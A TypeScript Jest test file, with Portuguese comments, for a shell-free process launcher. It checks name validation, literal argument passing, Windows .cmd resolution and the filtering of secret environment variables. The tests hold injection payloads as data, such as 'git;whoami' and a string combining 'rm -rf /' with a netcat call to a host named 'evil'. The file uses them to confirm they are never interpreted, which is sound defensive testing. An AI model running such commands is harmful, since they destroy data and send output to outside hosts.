import { readFileSync } from 'fs'
import { execFileSync } from 'child_process'
import { join } from 'path'
import {
  executarPrograma, resolverEntrypointJs, ambientePadrao,
} from '../executar-programa'

/**
 * Fase 1 de `docs/plano-execucao-tipada.md` — `executarPrograma()`, um único ponto, `shell: false`.
 *
 * Decisão 10 do plano: os testes de capability rodam **no Windows real** — é onde `.cmd`,
 * `PATHEXT` e o wrapper existem; rodar só em Linux testaria um caminho que não é o de produção.
 * Marcados para pular fora de `win32`, com o skip **contado e reportado**, nunca silencioso.
 */
const OPCOES = { cwd: process.cwd(), env: ambientePadrao(), timeoutMs: 15_000 } as const
const NO_WINDOWS = process.platform === 'win32' ? it : it.skip

describe('executarPrograma — anti-drift (shell: false é a proibição do plano)', () => {
  /**
   * A checagem é sobre o CÓDIGO, com comentários fora — mesma lição de
   * `supervised-session-permissoes.spec.ts`: uma busca ingênua acharia a citação de
   * `shell: true` dentro do próprio comentário que explica por que ele é proibido.
   */
  const fonte = readFileSync(join(__dirname, '..', 'executar-programa.ts'), 'utf8')
    .split(/\r?\n/).filter(l => !/^\s*\/\//.test(l) && !/^\s*\*/.test(l)).join('\n')

  it('nunca declara shell: true', () => {
    expect(fonte).not.toMatch(/shell:\s*true/)
  })

  it('toda ocorrência de "shell:" tem valor false', () => {
    const ocorrencias = fonte.match(/shell:\s*\w+/g) ?? []
    expect(ocorrencias.length).toBeGreaterThan(0) // o teste não pode passar por ausência
    for (const o of ocorrencias) expect(o).toBe('shell: false')
  })
})

describe('executarPrograma — nome de programa não é caminho', () => {
  it.each([
    ['git status', 'espaço'],
    ['C:\\Windows\\System32\\cmd.exe', 'caminho absoluto'],
    ['../evil', 'travessia'],
    ['git;whoami', 'metacaractere ;'],
    ['git&&whoami', 'metacaractere &&'],
    ['git`whoami`', 'crase'],
    ['git$(whoami)', 'subexpressão'],
  ])('rejeita "%s" (%s) antes de qualquer spawn', async (programa) => {
    await expect(executarPrograma('executavel', programa, [], OPCOES)).rejects.toThrow(/nome de programa inválido/i)
  })

  it('aceita nomes normais de executável', async () => {
    // Não afirma que RODA — só que passa da validação. spawn de um programa inexistente
    // rejeita por outro motivo (ENOENT), não pelo validador.
    await expect(executarPrograma('executavel', 'programa-que-nao-existe-9x7', [], OPCOES))
      .rejects.toThrow()
    await expect(executarPrograma('executavel', 'programa-que-nao-existe-9x7', [], OPCOES))
      .rejects.not.toThrow(/nome de programa inválido/i)
  })
})

describe('executarPrograma — estratégias sem implementação recusam alto', () => {
  it('helperFixo aponta para rodarHelper() em vez de fingir suporte', async () => {
    await expect(executarPrograma('helperFixo', 'clipboard-write', [], OPCOES))
      .rejects.toThrow(/rodarHelper/)
  })

  it('tarefaAgendada declara que não tem capability nenhuma usando ainda', async () => {
    await expect(executarPrograma('tarefaAgendada', 'alguma-tarefa', [], OPCOES))
      .rejects.toThrow(/sem implementação/)
  })
})

describe('ambientePadrao — piso, não teto', () => {
  it('copia só as chaves declaradas, nunca process.env inteiro', () => {
    const fonte = { PATH: 'C:\\x', SECRETO: 'nao-deveria-viajar', TEMP: 'C:\\t' } as NodeJS.ProcessEnv
    const r = ambientePadrao(fonte)

    expect(r.PATH).toBe('C:\\x')
    expect(r.TEMP).toBe('C:\\t')
    expect(r.SECRETO).toBeUndefined()
  })

  it('chave ausente na fonte simplesmente não aparece — nunca vira string vazia', () => {
    const r = ambientePadrao({} as NodeJS.ProcessEnv)
    expect(r.PATH).toBeUndefined()
    expect(Object.keys(r)).toHaveLength(0)
  })
})

// ── Windows real — decisão 10 do plano ──────────────────────────────────────────────────
describe('executarPrograma — Windows real', () => {
  /**
   * A inversão exata do defeito (Fase 0): um argumento com `;`, `&&`, aspas e espaço deve
   * chegar LITERAL ao programa, nunca interpretado. `node -e` imprime o argv recebido — se
   * algum ponto do caminho reinterpretasse o valor, ele não voltaria idêntico.
   */
  NO_WINDOWS('argumento com metacaractere chega literal ao programa', async () => {
    const adversarial = 'x; rm -rf / && echo PWNED | nc evil 1234 `whoami` $(whoami) "aspas" \'aspas\''
    const r = await executarPrograma('executavel', 'node', [
      '-e', 'process.stdout.write(process.argv[1])', adversarial,
    ], OPCOES)

    expect(r.code).toBe(0)
    expect(r.stdout).toBe(adversarial)
  })

  // `it.skip.each` fora do Windows: aparece no relatório como "skipped", nunca como um
  // "passou" vazio — é a diferença entre skip CONTADO e skip SILENCIOSO que a decisão 10 exige.
  const itPayload = process.platform === 'win32' ? it.each : it.skip.each
  itPayload([';', '&&', '||', '|', '`whoami`', '$(whoami)', '\n', '"aspas"', "'aspas'"])(
    'payload adversarial "%s" chega literal, um por um',
    async (payload: string) => {
      const r = await executarPrograma('executavel', 'node', [
        '-e', 'process.stdout.write(process.argv[1])', payload,
      ], OPCOES)
      expect(r.stdout).toBe(payload)
      // Timeout do Jest explícito (10s): mesma causa do comentário em "entrypointJs executa
      // pnpm de verdade" — a suíte cresceu com todos os testes de hoje que spawnam processo
      // real (git, prisma, docker, run-tests), e rodando em paralelo via `pnpm test` na
      // raiz, até um `node -e` (rápido isolado) pode passar do default de 5s sob contenção.
    },
    10_000,
  )

  NO_WINDOWS('resolve o .js real por trás do wrapper .cmd do pnpm — runner é node.exe', () => {
    const r = resolverEntrypointJs('pnpm')
    expect(r.js).toMatch(/\.js$/)
    expect(r.runner).toMatch(/node\.exe$/i)
    expect(r.envExtra).toEqual({})
    expect(readFileSync(r.js, 'utf8').length).toBeGreaterThan(0)
  })

  // Timeout do JEST explícito, MAIOR que `OPCOES.timeoutMs` (15s): sem isso o Jest mata o
  // teste no seu próprio default de 5s ANTES do timeout interno de `executarPrograma` sequer
  // disparar. Medido em 11/09 rodando `pnpm test` na raiz (as 3 apps em paralelo, uma delas
  // subindo um Nest de verdade): o `code --version` real passou de 5s por contenção de CPU,
  // embora isolado leve ~200ms. Não é flake do código — é um teste que spawna processo de
  // verdade tendo menos orçamento de tempo do que a própria chamada declara precisar.
  NO_WINDOWS('entrypointJs executa pnpm de verdade, sem shell', async () => {
    const r = await executarPrograma('entrypointJs', 'pnpm', ['--version'], OPCOES)
    expect(r.code).toBe(0)
    expect(r.stdout.trim()).toMatch(/^\d+\.\d+\.\d+/)
  }, 20_000)

  /**
   * `code.cmd` NÃO chama node.exe — chama `Code.exe` (Electron) com `ELECTRON_RUN_AS_NODE=1`.
   * É o motivo de `EntrypointResolvido` carregar `runner` e `envExtra` em vez de só o `.js`:
   * um resolver que presumisse node.exe sempre quebraria aqui, calado (o Code.exe abriria a
   * janela do editor em vez de rodar o cli.js). Roda só se o VS Code estiver instalado nesta
   * máquina — sem ele, a `where.exe` não encontra o `.cmd` e o teste é pulado, contado.
   */
  const temVsCode = (() => {
    try { execFileSync('where.exe', ['code'], { encoding: 'utf8' }); return true } catch { return false }
  })()
  const itVsCode = process.platform === 'win32' && temVsCode ? it : it.skip
  itVsCode('entrypointJs resolve code.cmd para Code.exe + ELECTRON_RUN_AS_NODE=1', async () => {
    const r = resolverEntrypointJs('code')
    expect(r.runner).toMatch(/Code\.exe$/i)
    expect(r.js).toMatch(/cli\.js$/i)
    expect(r.envExtra.ELECTRON_RUN_AS_NODE).toBe('1')

    // `--version` roda o cli.js e sai, sem abrir janela — prova que o ELECTRON_RUN_AS_NODE
    // aplicado por `executarPrograma()` (não só pelo resolver) é o que faz o Code.exe se
    // comportar como Node em vez de abrir o editor.
    const exec = await executarPrograma('entrypointJs', 'code', ['--version'], OPCOES)
    expect(exec.code).toBe(0)
    expect(exec.stdout.trim().split('\n')[0]).toMatch(/^\d+\.\d+\.\d+/)
    // Timeout do Jest explícito — ver o comentário do teste do pnpm acima. `Code.exe` é um
    // processo Electron de verdade, com o startup mais pesado dos três aqui.
  }, 20_000)

  NO_WINDOWS('capability desconhecida no PATH falha alto, não em runtime silencioso', () => {
    expect(() => resolverEntrypointJs('programa-cmd-que-nao-existe-9x7')).toThrow(/nenhum \.cmd\/\.bat/)
  })
})

/**
 * Fase 4 do plano — processo-filho não herda segredo. `ambientePadrao()` já é testado como
 * função pura acima ("piso, não teto") — o que falta é o teste que o próprio plano pede:
 * "spawn de um programa que imprime `process.env`, e a asserção é que `AGENT_TOKEN` não está
 * lá". Diferença deliberada: aqui o segredo é REAL no `process.env` do processo de teste (a
 * condição real de produção — `AGENT_TOKEN` sempre populado), e quem filtra é o caminho
 * inteiro (`executarPrograma` → `ambientePadrao()` → `spawn`), não uma chamada isolada da
 * função. Ambiente limpo passaria verde para sempre, igual ao teste do gerador de projeto.
 */
describe('Fase 4 — processo-filho não herda segredo (ponta a ponta, contra spawn real)', () => {
  const originais = {
    AGENT_TOKEN: process.env.AGENT_TOKEN,
    LITELLM_MASTER_KEY: process.env.LITELLM_MASTER_KEY,
    MCP_READONLY_TOKEN: process.env.MCP_READONLY_TOKEN,
  }

  beforeEach(() => {
    process.env.AGENT_TOKEN = 'segredo-agent-token-nao-pode-vazar'
    process.env.LITELLM_MASTER_KEY = 'segredo-litellm-nao-pode-vazar'
    process.env.MCP_READONLY_TOKEN = 'segredo-mcp-nao-pode-vazar'
  })

  afterEach(() => {
    for (const [chave, valor] of Object.entries(originais)) {
      if (valor === undefined) delete process.env[chave]
      else process.env[chave] = valor
    }
  })

  NO_WINDOWS('AGENT_TOKEN, LITELLM_MASTER_KEY e MCP_READONLY_TOKEN não chegam ao filho', async () => {
    const r = await executarPrograma('executavel', 'node', [
      '-e', 'process.stdout.write(JSON.stringify(process.env))',
    ], { cwd: process.cwd(), env: ambientePadrao(), timeoutMs: 15_000 })

    expect(r.code).toBe(0)
    const envDoFilho = JSON.parse(r.stdout) as Record<string, string | undefined>
    expect(envDoFilho.AGENT_TOKEN).toBeUndefined()
    expect(envDoFilho.LITELLM_MASTER_KEY).toBeUndefined()
    expect(envDoFilho.MCP_READONLY_TOKEN).toBeUndefined()
    // Prova negativa por si só provaria pouco (poderia ser um filho sem env nenhum) — o piso
    // (Fase 1) chega, é o resto que não deve.
    expect(envDoFilho.PATH).toBeDefined()
  }, 20_000)

  NO_WINDOWS('reintroduzir { ...process.env } no chamador volta a vazar — prova que o teste pega', async () => {
    // Vermelho de propósito: chamar com o ambiente INTEIRO no lugar de ambientePadrao(), a
    // mesma forma do defeito que existia em supervised-session.ts até 08/09. Se este teste
    // não capturasse o vazamento, o de cima também não capturaria — ele só prova ausência.
    const r = await executarPrograma('executavel', 'node', [
      '-e', 'process.stdout.write(JSON.stringify(process.env))',
    ], { cwd: process.cwd(), env: { ...process.env }, timeoutMs: 15_000 })

    const envDoFilho = JSON.parse(r.stdout) as Record<string, string | undefined>
    expect(envDoFilho.AGENT_TOKEN).toBe('segredo-agent-token-nao-pode-vazar')
  }, 20_000)
})
